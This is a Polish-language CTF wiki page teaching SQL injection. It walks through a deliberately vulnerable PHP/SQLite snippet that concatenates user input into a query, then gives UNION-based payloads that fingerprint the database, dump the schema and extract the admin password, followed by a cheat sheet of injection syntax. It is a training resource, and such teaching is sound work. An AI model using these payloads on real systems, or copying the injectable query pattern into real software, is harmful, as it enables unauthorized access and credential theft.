<!doctype html><html lang=pl class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=description content="Pomocna baza wiedzy na CTFy"><meta name=author content="Arek Arqsz Maruszczak"><meta name=lang:clipboard.copy content="Kopiuj do schowka"><meta name=lang:clipboard.copied content=Skopiowane><meta name=lang:search.language content=pl><meta name=lang:search.pipeline.stopwords content=False><meta name=lang:search.pipeline.trimmer content=False><meta name=lang:search.result.none content="Brak wyników wyszukiwania"><meta name=lang:search.result.one content="Wyniki wyszukiwania: 1"><meta name=lang:search.result.other content="Wyniki wyszukiwania: #"><meta name=lang:search.tokenizer content=[\s\-]+><link rel="shortcut icon" href=../../assets/images/favicon.ico><meta name=generator content="mkdocs-1.1, mkdocs-material-4.6.3"><title>SQLi - Baza wiedzy CTF</title><link rel=stylesheet href=../../assets/stylesheets/application.adb8469c.css><link rel=stylesheet href=../../assets/stylesheets/application-palette.a8b3c06d.css><meta name=theme-color content=#4caf50><script src=../../assets/javascripts/modernizr.86422ebf.js></script><link href=https://fonts.gstatic.com rel=preconnect crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,400i,700%7CUbuntu+Mono&display=fallback"><style>body,input{font-family:"Ubuntu","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Ubuntu Mono","Courier New",Courier,monospace}</style><link rel=stylesheet href=../../assets/fonts/material-icons.css></head> <body dir=ltr data-md-color-primary=green data-md-color-accent=green> <svg class=md-svg> <defs> <svg xmlns=http://www.w3.org/2000/svg width=416 height=448 viewbox="0 0 416 448" id=__github><path fill=currentColor d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg> </defs> </svg> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay data-md-component=overlay for=__drawer></label> <a href=#atak-sql-injection tabindex=0 class=md-skip> Przejdź do treści </a> <header class=md-header data-md-component=header> <nav class="md-header-nav md-grid"> <div class=md-flex> <div class="md-flex__cell md-flex__cell--shrink"> <a href=../.. title="Baza wiedzy CTF" aria-label="Baza wiedzy CTF" class="md-header-nav__button md-logo"> <i class=md-icon>bug_report</i> </a> </div> <div class="md-flex__cell md-flex__cell--shrink"> <label class="md-icon md-icon--menu md-header-nav__button" for=__drawer></label> </div> <div class="md-flex__cell md-flex__cell--stretch"> <div class="md-flex__ellipsis md-header-nav__title" data-md-component=title> <span class=md-header-nav__topic> Baza wiedzy CTF </span> <span class=md-header-nav__topic> SQLi </span> </div> </div> <div class="md-flex__cell md-flex__cell--shrink"> <label class="md-icon md-icon--search md-header-nav__button" for=__search></label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input aria-label=search name=query placeholder=Szukaj autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=query data-md-state=active> <label class="md-icon md-search__icon" for=__search></label> <button type=reset class="md-icon md-search__icon" data-md-component=reset tabindex=-1> &#xE5CD; </button> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=result> <div class=md-search-result__meta> Zacznij pisać, aby szukać </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> </div> <div class="md-flex__cell md-flex__cell--shrink"> <div class=md-header-nav__source> <a href=https://github.com/TheArqsz/ctf-wiki title="Idź do repozytorium" class=md-source data-md-source=github> <div class=md-source__icon> <svg viewbox="0 0 24 24" width=24 height=24> <use xlink:href=#__github width=24 height=24></use> </svg> </div> <div class=md-source__repository> TheArqsz/ctf-wiki </div> </a> </div> </div> </div> </nav> </header> <div class=md-container> <nav class="md-tabs md-tabs--active" data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Start </a> </li> <li class=md-tabs__item> <a href=../about/ class="md-tabs__link md-tabs__link--active"> Web </a> </li> <li class=md-tabs__item> <a href=../../misc/introduction-zh.md class=md-tabs__link> Misc </a> </li> </ul> </div> </nav> <main class=md-main role=main> <div class="md-main__inner md-grid" data-md-component=container> <div class="md-sidebar md-sidebar--primary" data-md-component=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" data-md-level=0> <label class="md-nav__title md-nav__title--site" for=__drawer> <a href=../.. title="Baza wiedzy CTF" class="md-nav__button md-logo"> <i class=md-icon>bug_report</i> </a> Baza wiedzy CTF </label> <div class=md-nav__source> <a href=https://github.com/TheArqsz/ctf-wiki title="Idź do repozytorium" class=md-source data-md-source=github> <div class=md-source__icon> <svg viewbox="0 0 24 24" width=24 height=24> <use xlink:href=#__github width=24 height=24></use> </svg> </div> <div class=md-source__repository> TheArqsz/ctf-wiki </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-toggle md-nav__toggle" data-md-toggle=nav-1 type=checkbox id=nav-1> <label class=md-nav__link for=nav-1> Start </label> <nav class=md-nav data-md-component=collapsible data-md-level=1> <label class=md-nav__title for=nav-1> Start </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. title=Wstęp class=md-nav__link> Wstęp </a> </li> <li class=md-nav__item> <a href=../../main/about/ title="O CTFach" class=md-nav__link> O CTFach </a> </li> <li class=md-nav__item> <a href=../../main/how_to_start/ title="Jak zacząć?" class=md-nav__link> Jak zacząć? </a> </li> <li class=md-nav__item> <a href=../../main/what_next/ title="Co dalej?" class=md-nav__link> Co dalej? </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-toggle md-nav__toggle" data-md-toggle=nav-2 type=checkbox id=nav-2 checked> <label class=md-nav__link for=nav-2> Web </label> <nav class=md-nav data-md-component=collapsible data-md-level=1> <label class=md-nav__title for=nav-2> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../about/ title="O kategorii" class=md-nav__link> O kategorii </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-toggle md-nav__toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> SQLi </label> <a href=./ title=SQLi class="md-nav__link md-nav__link--active"> SQLi </a> <nav class="md-nav md-nav--secondary"> <label class=md-nav__title for=__toc>Spis treści</label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#przykad-praktyczny class=md-nav__link> Przykład praktyczny </a> </li> <li class=md-nav__item> <a href=#przydatne-zapytania class=md-nav__link> Przydatne zapytania </a> <nav class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a href=#komentarze class=md-nav__link> Komentarze </a> </li> <li class=md-nav__item> <a href=#instrukcja-warunkowa-if class=md-nav__link> Instrukcja warunkowa if </a> <nav class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a href=#mysql class=md-nav__link> MySQL </a> </li> <li class=md-nav__item> <a href=#postgresql class=md-nav__link> PostgreSQL </a> </li> <li class=md-nav__item> <a href=#oracle class=md-nav__link> Oracle </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#liczby-szesnastkowe class=md-nav__link> Liczby szesnastkowe </a> </li> <li class=md-nav__item> <a href=#znaki-i-ciagi-znakow class=md-nav__link> Znaki i ciągi znaków </a> </li> <li class=md-nav__item> <a href=#union class=md-nav__link> Union </a> </li> <li class=md-nav__item> <a href=#join class=md-nav__link> Join </a> </li> <li class=md-nav__item> <a href=#inne class=md-nav__link> Inne </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-toggle md-nav__toggle" data-md-toggle=nav-3 type=checkbox id=nav-3> <label class=md-nav__link for=nav-3> Misc </label> <nav class=md-nav data-md-component=collapsible data-md-level=1> <label class=md-nav__title for=nav-3> Misc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../misc/introduction-zh.md title="Miscellaneous Introduction" class=md-nav__link> Miscellaneous Introduction </a> </li> <li class=md-nav__item> <a href=../../misc/recon-zh.md title="Information Gathering Technology" class=md-nav__link> Information Gathering Technology </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-toggle md-nav__toggle" data-md-toggle=nav-3-3 type=checkbox id=nav-3-3> <label class=md-nav__link for=nav-3-3> Code Analysis </label> <nav class=md-nav data-md-component=collapsible data-md-level=2> <label class=md-nav__title for=nav-3-3> Code Analysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../misc/encode/communication-zh.md title="Commonly Used Coding in the Communication Field" class=md-nav__link> Commonly Used Coding in the Communication Field </a> </li> <li class=md-nav__item> <a href=../../misc/encode/computer-zh.md title="Computer Related Coding" class=md-nav__link> Computer Related Coding </a> </li> <li class=md-nav__item> <a href=../../misc/encode/modern-zh.md title="Commonly Used Encodings in the Real World" class=md-nav__link> Commonly Used Encodings in the Real World </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../misc/prefix-zh.md title="Forensic Steganography" class=md-nav__link> Forensic Steganography </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary"> <label class=md-nav__title for=__toc>Spis treści</label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#przykad-praktyczny class=md-nav__link> Przykład praktyczny </a> </li> <li class=md-nav__item> <a href=#przydatne-zapytania class=md-nav__link> Przydatne zapytania </a> <nav class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a href=#komentarze class=md-nav__link> Komentarze </a> </li> <li class=md-nav__item> <a href=#instrukcja-warunkowa-if class=md-nav__link> Instrukcja warunkowa if </a> <nav class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a href=#mysql class=md-nav__link> MySQL </a> </li> <li class=md-nav__item> <a href=#postgresql class=md-nav__link> PostgreSQL </a> </li> <li class=md-nav__item> <a href=#oracle class=md-nav__link> Oracle </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#liczby-szesnastkowe class=md-nav__link> Liczby szesnastkowe </a> </li> <li class=md-nav__item> <a href=#znaki-i-ciagi-znakow class=md-nav__link> Znaki i ciągi znaków </a> </li> <li class=md-nav__item> <a href=#union class=md-nav__link> Union </a> </li> <li class=md-nav__item> <a href=#join class=md-nav__link> Join </a> </li> <li class=md-nav__item> <a href=#inne class=md-nav__link> Inne </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content> <article class="md-content__inner md-typeset"> <h1 id=atak-sql-injection>Atak SQL injection<a class=headerlink href=#atak-sql-injection title="Permanent link">&para;</a></h1> <p>Wszyscy znamy strony, które zawierają w sobie formularze czy przekazują w inny sposób wszelakie parametry. A co jeśli parametry te nie są prawidłowo przetworzone po stronie serwera i bezpośrednio trafiają do zapytań SQL?</p> <h2 id=przykad-praktyczny>Przykład praktyczny<a class=headerlink href=#przykad-praktyczny title="Permanent link">&para;</a></h2> <p>Weźmy na warsztat <a href=https://github.com/TheArqsz/ctf-wiki/tree/master/examples/sqlinjection>przykładową aplikację</a> wykorzystującą bazę danych SQLlite3.</p> <p>Jest to prosta strona z formularzem, do którego jeśli podamy imię to zwróci nam czy jest ono śmieszne czy nie.</p> <p><img alt="Aplikacja PHP" src=/ctf-wiki/assets/images/web/sqlinjection/php_app.png></p> <p>Po wpisaniu imienia, jest ono wysyłane do serwera php w celu dalszej obróbki. Tak wygląda fragment kodu odpowiadający za zapytanie do bazy danych:</p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1
2
3
4</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=x>$name = $_GET[&quot;name&quot;];</span>
<span class=x>$db = new SQLite3(&#39;example.db&#39;);</span>
<span class=x>$query = &quot;SELECT is_funny FROM funny as f, users as u JOIN users ON f.user_name=u.user_name WHERE u.user_name=&#39;$name&#39;&quot;;</span>
<span class=x>$result = @$db-&gt;query($query);</span>
</code></pre></div> </td></tr></table> <p>Po wpisaniu <code>admin</code> otrzymujemy wynik <code>not funny</code>. </p> <p>Na początek należy przeprowadzić weryfikację czy atak SQLi jest możliwy. Można to zrobić przez podanie <code>'</code> zamiast parametru.</p> <p><img alt="Aplikacja PHP - podatna?" src=/ctf-wiki/assets/images/web/sqlinjection/php_app_check.png></p> <p>Informacja ta mówi nam o tym, że jest to strona podatna na atak. Następnym krokiem będzie weryfikacja z jakim typem bazy danych mamy do czynienia. Można to zrobić przez sprawdzenie wersji oprogramowania - polecenie to różni się między dialektami</p> <table> <thead> <tr> <th>Dialekt</th> <th>Polecenie</th> </tr> </thead> <tbody> <tr> <td>MySQL</td> <td><code>SELECT @@version</code></td> </tr> <tr> <td>Oracle</td> <td><code>SELECT * FROM v$version</code></td> </tr> <tr> <td>PostgreSQL</td> <td><code>SELECT version()</code></td> </tr> <tr> <td>Sqlite3</td> <td><code>SELECT sqlite_version()</code></td> </tr> </tbody> </table> <p>Wykonać to można przez manipulację poleceniem <code>UNION</code>, który łączy wyniki z dwóch lub więcej zapytań SQL w jedno. W tym przypadku będzie to </p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=k>admin</span><span class=err>&#39;</span> <span class=k>UNION</span> <span class=k>SELECT</span> <span class=n>sqlite_version</span><span class=p>();</span> <span class=c1>--</span>
</code></pre></div> </td></tr></table> <p>Polecenie to zostanie po stronie serwera zamienione w:</p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1
2
3
4</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=k>SELECT</span> <span class=n>is_funny</span> <span class=k>FROM</span> <span class=n>funny</span> <span class=k>as</span> <span class=n>f</span><span class=p>,</span> <span class=n>users</span> <span class=k>as</span> <span class=n>u</span> 
    <span class=k>JOIN</span> <span class=n>users</span> <span class=k>ON</span> <span class=n>f</span><span class=p>.</span><span class=n>user_name</span><span class=o>=</span><span class=n>u</span><span class=p>.</span><span class=n>user_name</span> 
    <span class=k>WHERE</span> <span class=n>u</span><span class=p>.</span><span class=n>user_name</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span> 
<span class=k>UNION</span> <span class=k>SELECT</span> <span class=n>sqlite_version</span><span class=p>();</span> <span class=c1>--&#39;</span>
</code></pre></div> </td></tr></table> <p><img alt="Aplikacja PHP - podatna?" src=/ctf-wiki/assets/images/web/sqlinjection/php_app_version.png></p> <p>Dzięki temu wiemy, że jest to baza Sqlite3. Następnym krokiem będzie ekstrakcja nazw tabel i kolumn. Zrobić to można poleceniem </p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=k>SELECT</span> <span class=k>sql</span> <span class=k>from</span> <span class=n>sqlite_master</span><span class=p>;</span> 
</code></pre></div> </td></tr></table> <p>które w tym przypadku przybierze formę</p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=k>admin</span><span class=err>&#39;</span> <span class=k>UNION</span> <span class=k>SELECT</span> <span class=k>sql</span> <span class=k>from</span> <span class=n>sqlite_master</span><span class=p>;</span> <span class=c1>--</span>
</code></pre></div> </td></tr></table> <p><img alt="Aplikacja PHP - kolumny" src=/ctf-wiki/assets/images/web/sqlinjection/php_app_columns.png></p> <p>Jako, że <code>UNION</code> wymaga takiej samej ilości kolumn w wyniku obu zapytań, dane z bazy będzie można wyciągać tylko pojedyńczo. Przykładowo hasło użytkownika <code>admin</code> pozyskamy stosując polecenie</p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=k>admin</span><span class=s1>&#39; UNION SELECT password from users WHERE user_name = &#39;</span><span class=k>admin</span><span class=err>&#39;</span><span class=p>;</span> <span class=c1>--</span>
</code></pre></div> </td></tr></table> <p><img alt="Aplikacja PHP - haslo" src=/ctf-wiki/assets/images/web/sqlinjection/php_app_password.png></p> <h2 id=przydatne-zapytania>Przydatne zapytania<a class=headerlink href=#przydatne-zapytania title="Permanent link">&para;</a></h2> <h3 id=komentarze>Komentarze<a class=headerlink href=#komentarze title="Permanent link">&para;</a></h3> <ul> <li><code>--</code></li> <li><code>#</code></li> <li><code>/**/</code></li> <li><code>/*! MYSQL Special SQL */</code> (<strong>tylko w MySQL</strong>)</li> </ul> <h3 id=instrukcja-warunkowa-if>Instrukcja warunkowa <code>if</code><a class=headerlink href=#instrukcja-warunkowa-if title="Permanent link">&para;</a></h3> <h4 id=mysql>MySQL<a class=headerlink href=#mysql title="Permanent link">&para;</a></h4> <ul> <li><code>IF(warunek, wykonaj_jesli_prawda, wykonaj_jeśli_fałsz)</code></li> </ul> <h4 id=postgresql>PostgreSQL<a class=headerlink href=#postgresql title="Permanent link">&para;</a></h4> <ul> <li><code>SELECT CASE WHEN warunek THEN wykonaj_jesli_prawda ELSE wykonaj_jeśli_fałsz END;</code></li> </ul> <h4 id=oracle>Oracle<a class=headerlink href=#oracle title="Permanent link">&para;</a></h4> <ul> <li><code>BEGIN IF warunek THEN wykonaj_jesli_prawda; ELSE wykonaj_jeśli_fałsz; END IF; END;</code></li> </ul> <h3 id=liczby-szesnastkowe>Liczby szesnastkowe<a class=headerlink href=#liczby-szesnastkowe title="Permanent link">&para;</a></h3> <p>Są one szczególnie przydatne w przypadku gdy jakieś znaki są zakazane.</p> <ul> <li><code>56 == 0x38</code></li> </ul> <h3 id=znaki-i-ciagi-znakow>Znaki i ciągi znaków<a class=headerlink href=#znaki-i-ciagi-znakow title="Permanent link">&para;</a></h3> <ul> <li><code>SELECT CHAR(0x41);</code> - zwróci znak ASCII o wartości szesnastkowej <code>0x41</code></li> <li><code>SELECT ASCII('a');</code> - zwróci wartość dziesiętną litery wysuniętej najbardziej na lewo w ciągu znaków</li> <li><code>SELECT CONCAT(str1, str2, str3, ...);</code> - konkatencja stringów (<strong>tylko MySQL</strong>)</li> <li><code>SELECT 'A' || 'B' || 'C';</code> - konkatencja stringów; zwróci <code>ABC</code></li> </ul> <h3 id=union>Union<a class=headerlink href=#union title="Permanent link">&para;</a></h3> <p>Unie są bardzo przydatne gdy potrzebujemy wyciągnąć dane z wielu tabel mając do dyspozycji tylko jedno zapytanie.</p> <div class="admonition warning"> <p class=admonition-title>Uwaga</p> <p>Unie wymagają takiej samej ilości kolumn w obu zapytaniach, które łączą</p> </div> <p>Wyobraźmy sobie dwie tabele: </p> <ul> <li><code>użytkownicy</code></li> </ul> <table> <thead> <tr> <th>id</th> <th>nazwa</th> <th>hasło</th> </tr> </thead> <tbody> <tr> <td>1</td> <td>admin</td> <td>admin12345</td> </tr> <tr> <td>2</td> <td>user</td> <td>pass12345</td> </tr> </tbody> </table> <ul> <li><code>komputery</code></li> </ul> <table> <thead> <tr> <th>id</th> <th>user_id</th> <th>model</th> </tr> </thead> <tbody> <tr> <td>1</td> <td>2</td> <td>Lenovo Yoga</td> </tr> <tr> <td>2</td> <td>1</td> <td>Dell Inspiron</td> </tr> </tbody> </table> <p>Do dyspozycji mamy tylko zapytanie</p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=k>SELECT</span> <span class=n>nazwa</span><span class=p>,</span> <span class=n>id</span> <span class=k>FROM</span> <span class=n>użytkownicy</span><span class=p>;</span>
</code></pre></div> </td></tr></table> <p>Otrzymamy w ten sposób jedną listę rekordów z nazwami użytkowników i ich hasłami</p> <table> <thead> <tr> <th>nazwa</th> <th>hasło</th> </tr> </thead> <tbody> <tr> <td>admin</td> <td>admin12345</td> </tr> <tr> <td>user</td> <td>pass12345</td> </tr> </tbody> </table> <p>Aby wyświetlić dodatkowo zawartość kolumny <code>model</code> z tabeli <code>komputery</code> za pomocą unii należy wykonać polecenie</p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=k>SELECT</span> <span class=n>nazwa</span><span class=p>,</span> <span class=n>id</span> <span class=k>FROM</span> <span class=n>użytkownicy</span> <span class=k>UNION</span> <span class=k>SELECT</span> <span class=n>model</span><span class=p>,</span> <span class=mi>1</span> <span class=k>FROM</span> <span class=n>komputery</span><span class=p>;</span>
</code></pre></div> </td></tr></table> <p>Zauważmy, że wymuszone zostały tutaj stałe wartości <code>1</code> aby ilość kolumn w obu wyrażeniach <code>SELECT</code> połączonych unią się zgadzała. W ten sposób otrzymamy wynik:</p> <table> <thead> <tr> <th>nazwa</th> <th>hasło</th> </tr> </thead> <tbody> <tr> <td>admin</td> <td>admin12345</td> </tr> <tr> <td>user</td> <td>pass12345</td> </tr> <tr> <td>Lenovo Yoga</td> <td>1</td> </tr> <tr> <td>Dell Inspiron</td> <td>1</td> </tr> </tbody> </table> <p>Graficznie wygląda to następująco</p> <p><img alt=UNION src=/ctf-wiki/assets/images/web/sqlinjection/union_query.png></p> <h3 id=join>Join<a class=headerlink href=#join title="Permanent link">&para;</a></h3> <p><code>Join</code> łączy dane z dwóch zapytań w jedną tabelę. Każdy wiersz tabeli wynikowej zawiera elementy z obu zbiorów. Wykonany zostaje na tabelach tzw. <em>iloczyn kartezjański</em> czyli każdy element z jednej tabeli ma odwzorowanie w elementach drugiej tabeli.</p> <p>Wyobraźmy sobie dwie tabele: </p> <ul> <li><code>użytkownicy</code></li> </ul> <table> <thead> <tr> <th>id</th> <th>nazwa</th> <th>hasło</th> </tr> </thead> <tbody> <tr> <td>1</td> <td>admin</td> <td>admin12345</td> </tr> <tr> <td>2</td> <td>user</td> <td>pass12345</td> </tr> </tbody> </table> <ul> <li><code>komputery</code></li> </ul> <table> <thead> <tr> <th>id</th> <th>user_id</th> <th>model</th> </tr> </thead> <tbody> <tr> <td>1</td> <td>2</td> <td>Lenovo Yoga</td> </tr> <tr> <td>2</td> <td>1</td> <td>Dell Inspiron</td> </tr> </tbody> </table> <p>Załóżmy, że chcemy zobaczyć komputery użytkownika <code>admin</code>. Możemy to osiągnać poleceniem:</p> <table class=codehilitetable><tr><td class=linenos><div class=linenodiv><pre>1</pre></div></td><td class=code><div class=codehilite><pre><span></span><code><span class=k>SELECT</span> <span class=o>*</span> <span class=k>FROM</span> <span class=n>użytkownicy</span> <span class=k>AS</span> <span class=n>u</span> <span class=k>JOIN</span> <span class=n>komputery</span> <span class=k>AS</span> <span class=n>k</span> <span class=k>ON</span> <span class=n>u</span><span class=p>.</span><span class=n>id</span> <span class=o>=</span> <span class=n>k</span><span class=p>.</span><span class=n>user_id</span><span class=p>;</span>
</code></pre></div> </td></tr></table> <p>W odpowiedzi otrzymamy:</p> <table> <thead> <tr> <th>u.id</th> <th>u.nazwa</th> <th>u.hasło</th> <th>k.id</th> <th>k.user_id</th> <th>k.model</th> </tr> </thead> <tbody> <tr> <td>1</td> <td>admin</td> <td>admin12345</td> <td>2</td> <td>1</td> <td>Dell Inspiron</td> </tr> </tbody> </table> <p>Graficznie wygląda to następująco</p> <p><img alt=JOIN src=/ctf-wiki/assets/images/web/sqlinjection/join_query.png></p> <h3 id=inne>Inne<a class=headerlink href=#inne title="Permanent link">&para;</a></h3> <div class="admonition info"> <p class=admonition-title>Info</p> <p>Więcej przykładów znaleźć można <a href=https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ >tutaj</a> lub <a href=https://portswigger.net/web-security/sql-injection/cheat-sheet>tutaj</a></p> </div> </article> </div> </div> </main> <footer class=md-footer> <div class=md-footer-nav> <nav class="md-footer-nav__inner md-grid"> <a href=../about/ title="O kategorii" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel=prev> <div class="md-flex__cell md-flex__cell--shrink"> <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i> </div> <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title"> <span class=md-flex__ellipsis> <span class=md-footer-nav__direction> Poprzednia strona </span> O kategorii </span> </div> </a> </nav> </div> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2020 Arek 'Arqsz' Maruszczak </div> powered by <a href=https://www.mkdocs.org target=_blank rel=noopener>MkDocs</a> and <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs</a> </div> <div class=md-footer-social> <link rel=stylesheet href=../../assets/fonts/font-awesome.css> <a href=https://github.com/TheArqsz target=_blank rel=noopener title=github class="md-footer-social__link fa fa-github"></a> <a href=https://twitter.com/Arqsz target=_blank rel=noopener title=twitter class="md-footer-social__link fa fa-twitter"></a> <a href=https://telegram.me/Arqsz target=_blank rel=noopener title=telegram class="md-footer-social__link fa fa-telegram"></a> <a href=https://www.linkedin.com/in/amaruszczak target=_blank rel=noopener title=linkedin class="md-footer-social__link fa fa-linkedin"></a> </div> </div> </div> </footer> </div> <script src=../../assets/javascripts/application.c33a9706.js></script> <script src=../../assets/javascripts/lunr/lunr.stemmer.support.js></script> <script>app.initialize({version:"1.1",url:{base:"../.."}})</script> </body> </html>